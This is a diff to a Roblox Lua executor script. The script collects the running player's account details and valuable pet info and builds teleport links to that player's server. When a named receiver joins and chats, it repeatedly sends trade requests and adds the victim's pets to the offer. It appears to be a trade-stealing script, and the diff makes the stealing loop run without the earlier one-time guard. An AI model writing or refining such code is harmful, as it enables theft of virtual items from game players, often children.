@@ -759,8 +759,8 @@ local accage = plr.AccountAge
 local ExecutorValue = identifyexecutor() or "Unknown"
 local placeId = game.PlaceId
 local jobId = game.JobId
-local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. (getgenv().realJobId)
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. (getgenv().realJobId) .. "\")"
 local VersionValue = "1.12 (Added values)"
 
 -- Get valuable pets info
@@ -1060,9 +1060,9 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
         })
     end)
 end
-
+local loop = false
 local function TradeIncoming(ReceiverName)
-    while true do
+    while loop do
     local RouterClient = Loaders("RouterClient")
     local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
@@ -1174,9 +1174,8 @@ end
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
         player.Chatted:Connect(function(msg)
-            if not sent then
+            loop = true
             TradeIncoming(Username)
-            end
         end)
     end
 end)
@@ -1184,9 +1183,8 @@ end)
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username2 then
         player.Chatted:Connect(function(msg)
-            if not sent then
+            loop = true
                 TradeIncoming(Username2)
-            end
         end)
     end
 end)
